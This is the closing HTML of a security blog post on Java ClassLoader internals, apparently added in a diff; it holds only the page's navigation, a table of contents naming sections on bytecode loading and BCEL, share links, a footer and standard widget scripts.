+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">类加载器分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JVM%E9%BB%98%E8%AE%A4%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">JVM默认类加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BootstrapClassLoader"><span class="toc-number">2.1.1.</span> <span class="toc-text">BootstrapClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ExtensionsClassLoader"><span class="toc-number">2.1.2.</span> <span class="toc-text">ExtensionsClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AppClassLoader"><span class="toc-number">2.1.3.</span> <span class="toc-text">AppClassLoader</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">自定义类加载器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">ClassLoader类加载流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">双亲委派机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">动态加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.</span> <span class="toc-text">URLClassLoader加载远程字节码文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.2.</span> <span class="toc-text">ClassLoader加载字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.3.</span> <span class="toc-text">TemplatesImpl加载字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL-ClassLoader"><span class="toc-number">5.4.</span> <span class="toc-text">BCEL ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-number">5.4.1.</span> <span class="toc-text">BCEL兼容性问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">5.4.2.</span> <span class="toc-text">BCEL攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">5.4.3.</span> <span class="toc-text">测试代码</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&text=ClassLoader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&is_video=false&description=ClassLoader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ClassLoader&body=Check out this article: https://h3rmesk1t.github.io/2023/04/14/ClassLoader/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&name=ClassLoader&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&t=ClassLoader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
